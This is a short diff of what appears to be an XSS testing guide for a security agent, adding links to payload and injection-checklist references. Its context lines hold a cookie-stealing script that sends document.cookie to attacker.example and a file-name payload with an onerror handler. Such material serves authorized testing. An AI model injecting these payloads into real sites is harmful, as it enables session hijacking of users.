@@ -123,3 +123,8 @@ new Image().src='https://attacker.example/steal?c='+document.cookie  // Session 
 2. Navigate to every page where stored data displays
 3. Test file upload names: `"><img src=x onerror=alert(1)>.jpg`
 4. Test metadata: EXIF data, document properties
+
+## Extended Resources
+
+- `agent/references/payloads/xss-payloads.md` — DOM XSS, reflected, stored, filter bypass, CSP bypass, polyglots
+- `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
